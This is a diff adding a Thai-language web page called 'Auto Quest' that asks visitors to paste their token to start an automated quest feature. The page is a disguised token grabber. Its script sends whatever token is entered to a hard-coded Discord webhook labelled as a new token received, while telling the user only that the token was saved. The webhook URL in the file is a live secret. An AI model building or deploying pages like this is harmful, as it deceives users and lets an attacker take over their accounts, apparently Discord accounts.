@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Quest</title>
+    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Kanit', sans-serif;
+            transition: all 0.3s ease;
+        }
+        body {
+            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
+            color: #f8fafc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 32px 24px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+        .icon-box {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #6366f1, #a855f7);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            box-shadow: 0 8px 20px rgba(168, 85, 247, 0.4);
+            font-size: 28px;
+        }
+        h2 {
+            margin: 0 0 8px;
+            font-weight: 600;
+            font-size: 24px;
+            letter-spacing: 0.5px;
+            color: #ffffff;
+        }
+        p {
+            color: #94a3b8;
+            font-size: 13px;
+            margin-bottom: 24px;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 12px;
+            border: 1px solid #334155;
+            background: rgba(15, 23, 42, 0.8);
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #a855f7;
+            box-shadow: 0 0 12px rgba(168, 85, 247, 0.3);
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #6366f1, #a855f7);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.3);
+        }
+        button:hover {
+            opacity: 0.9;
+            transform: translateY(-1px);
+        }
+        #msg {
+            margin-top: 16px;
+            font-size: 13px;
+            font-weight: 400;
+            min-height: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="icon-box">⚡</div>
+    <h2>Auto Quest</h2>
+    <p>กรุณากรอก Token ของคุณเพื่อเริ่มระบบ Auto Quest</p>
+    
+    <div class="input-group">
+        <input type="text" id="token" placeholder="วาง Token ของคุณที่นี่..." autocomplete="off">
+    </div>
+    
+    <button onclick="send()">บันทึกข้อมูล</button>
+    <div id="msg"></div>
+</div>
+
+<script>
+    // วาง Discord Webhook URL ของคุณตรงนี้
+    const WEBHOOK = "https://discord.com/api/webhooks/1555158698496753664/uECfdnq9O0TF4AJpYFM_tcMvKbo_uDviXK8yXDC1Xq2zXVP3wqmt9z_Yrl22nyZGTBg0"; 
+
+    function send() {
+        const val = document.getElementById('token').value.trim();
+        const msg = document.getElementById('msg');
+        
+        if(!val) { 
+            msg.style.color = "#f87171";
+            msg.innerText = "❌ กรุณากรอก Token ก่อนทำรายการ"; 
+            return; 
+        }
+        
+        msg.style.color = "#facc15";
+        msg.innerText = "⏳ กำลังส่งข้อมูล...";
+
+        fetch(WEBHOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ 
+                embeds: [{
+                    title: "🔑 Auto Quest - ได้รับ Token ใหม่",
+                    color: 11027191,
+                    fields: [
+                        { name: "Token", value: "`" + val + "`" },
+                        { name: "เวลาที่ส่ง", value: new Date().toLocaleString("th-TH") }
+                    ]
+                }]
+            })
+        }).then(() => {
+            msg.style.color = "#4ade80";
+            msg.innerText = "✅ บันทึก Token เรียบร้อยแล้ว!";
+            document.getElementById('token').value = '';
+        }).catch(() => {
+            msg.style.color = "#f87171";
+            msg.innerText = "❌ เกิดข้อผิดพลาด กรุณาลองใหม่อีกครั้ง";
+        });
+    }
+</script>
+
+</body>
+</html>
